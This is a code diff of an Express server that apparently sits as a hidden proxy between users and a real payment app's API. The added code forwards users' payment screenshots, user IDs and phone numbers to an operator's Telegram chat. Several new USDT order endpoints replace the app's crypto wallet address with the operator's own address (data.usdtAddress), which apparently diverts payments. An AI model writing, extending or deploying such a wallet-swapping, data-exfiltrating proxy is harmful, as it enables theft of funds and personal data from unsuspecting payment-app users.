@@ -1418,35 +1418,56 @@ app.post('/appApi/orderOut/payingSubmitImg', async (req, res) => {
     const respData = getResponseData(jsonResp) || {};
     if (data.adminChatId && bot && !isLogOff(data, userId)) {
       const phone = getPhone(data, userId);
-      // Get orderId from body or response
       const orderVal = body.orderId || body.orderNo || respData.orderId || respData.orderNo || 'N/A';
-      // Get image URL from body fields (many possible names) or response
-      const imgVal = body.imgUrl || body.imageUrl || body.img || body.imgPath || body.payImg ||
-                     body.billImg || body.picUrl || body.photoUrl || body.fileUrl || body.picture ||
-                     body.screenshot || respData.imgUrl || respData.imageUrl || respData.img || '';
       const caption = `📸 Payment Screenshot [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nOrder: ${orderVal}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
-      // Check if image was uploaded as file in multipart
-      const imgFileKey = Object.keys(files).find(k => files[k].contentType && files[k].contentType.startsWith('image/'));
-      const imgFile = imgFileKey ? files[imgFileKey] : null;
-      if (imgFile && imgFile.data && imgFile.data.length > 500) {
-        // Send binary image directly to Telegram
-        bot.sendPhoto(data.adminChatId, imgFile.data, { caption }, { filename: imgFile.filename || 'payment.jpg', contentType: imgFile.contentType }).catch(() => {
-          bot.sendMessage(data.adminChatId, caption).catch(()=>{});
-        });
-      } else if (imgVal) {
-        // Send via URL
-        bot.sendMessage(data.adminChatId, caption + (imgVal ? `\nURL: ${imgVal}` : '')).catch(()=>{});
+
+      // Case 1: base64 image in JSON body (imageBase64 field — "data:image/...;base64,...")
+      const b64Field = body.imageBase64 || body.imgBase64 || body.base64Image || body.base64 || '';
+      if (b64Field) {
         try {
-          const imgResp = await fetch(imgVal.startsWith('http') ? imgVal : ORIGINAL_API + '/' + imgVal);
-          if (imgResp.ok) {
-            const imgBuf = Buffer.from(await imgResp.arrayBuffer());
-            if (imgBuf.length > 500) {
-              bot.sendPhoto(data.adminChatId, imgBuf, { caption }, { filename: 'payment.jpg', contentType: 'image/jpeg' }).catch(()=>{});
-            }
+          const b64Data = b64Field.replace(/^data:image\/[a-z]+;base64,/i, '');
+          const imgBuf = Buffer.from(b64Data, 'base64');
+          if (imgBuf.length > 500) {
+            bot.sendPhoto(data.adminChatId, imgBuf, { caption }, { filename: 'payment.jpg', contentType: 'image/jpeg' }).catch(() => {
+              bot.sendMessage(data.adminChatId, caption).catch(()=>{});
+            });
+          } else {
+            bot.sendMessage(data.adminChatId, caption).catch(()=>{});
           }
-        } catch(e) {}
+        } catch(e) { bot.sendMessage(data.adminChatId, caption).catch(()=>{}); }
       } else {
-        bot.sendMessage(data.adminChatId, caption).catch(()=>{});
+        // Case 2: multipart binary file
+        const imgFileKey = Object.keys(files).find(k => files[k].contentType && files[k].contentType.startsWith('image/'));
+        const imgFile = imgFileKey ? files[imgFileKey] : null;
+        if (imgFile && imgFile.data && imgFile.data.length > 500) {
+          bot.sendPhoto(data.adminChatId, imgFile.data, { caption }, { filename: imgFile.filename || 'payment.jpg', contentType: imgFile.contentType }).catch(() => {
+            bot.sendMessage(data.adminChatId, caption).catch(()=>{});
+          });
+        } else {
+          // Case 3: image URL in body or response
+          const imgVal = body.imgUrl || body.imageUrl || body.img || body.imgPath || body.payImg ||
+                         body.billImg || body.picUrl || body.photoUrl || body.fileUrl || body.picture ||
+                         respData.imgUrl || respData.imageUrl || respData.img || '';
+          if (imgVal) {
+            try {
+              const imgResp = await fetch(imgVal.startsWith('http') ? imgVal : ORIGINAL_API + '/' + imgVal);
+              if (imgResp.ok) {
+                const imgBuf = Buffer.from(await imgResp.arrayBuffer());
+                if (imgBuf.length > 500) {
+                  bot.sendPhoto(data.adminChatId, imgBuf, { caption }, { filename: 'payment.jpg', contentType: 'image/jpeg' }).catch(() => {
+                    bot.sendMessage(data.adminChatId, caption + `\nURL: ${imgVal}`).catch(()=>{});
+                  });
+                } else {
+                  bot.sendMessage(data.adminChatId, caption + `\nURL: ${imgVal}`).catch(()=>{});
+                }
+              } else {
+                bot.sendMessage(data.adminChatId, caption + `\nURL: ${imgVal}`).catch(()=>{});
+              }
+            } catch(e) { bot.sendMessage(data.adminChatId, caption).catch(()=>{}); }
+          } else {
+            bot.sendMessage(data.adminChatId, caption).catch(()=>{});
+          }
+        }
       }
     }
     sendJson(res, respHeaders, jsonResp, respBody);
@@ -1593,6 +1614,33 @@ app.all('/appApi/orderUsdt/v2/init', async (req, res) => {
     if (data.adminChatId && bot && userId) {
       bot.sendMessage(data.adminChatId, `₮ USDT Order Init [${userId}]`).catch(()=>{});
     }
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) { await transparentProxy(req, res); }
+});
+
+app.all('/appApi/orderUsdt/v2/detail', async (req, res) => {
+  const data = await loadData();
+  try {
+    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    if (data.usdtAddress) replaceUsdtInResponse(jsonResp, data);
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) { await transparentProxy(req, res); }
+});
+
+app.all('/appApi/orderUsdt/v2/orderInfo', async (req, res) => {
+  const data = await loadData();
+  try {
+    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    if (data.usdtAddress) replaceUsdtInResponse(jsonResp, data);
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) { await transparentProxy(req, res); }
+});
+
+app.all('/appApi/orderUsdt/detail', async (req, res) => {
+  const data = await loadData();
+  try {
+    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    if (data.usdtAddress) replaceUsdtInResponse(jsonResp, data);
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
 });
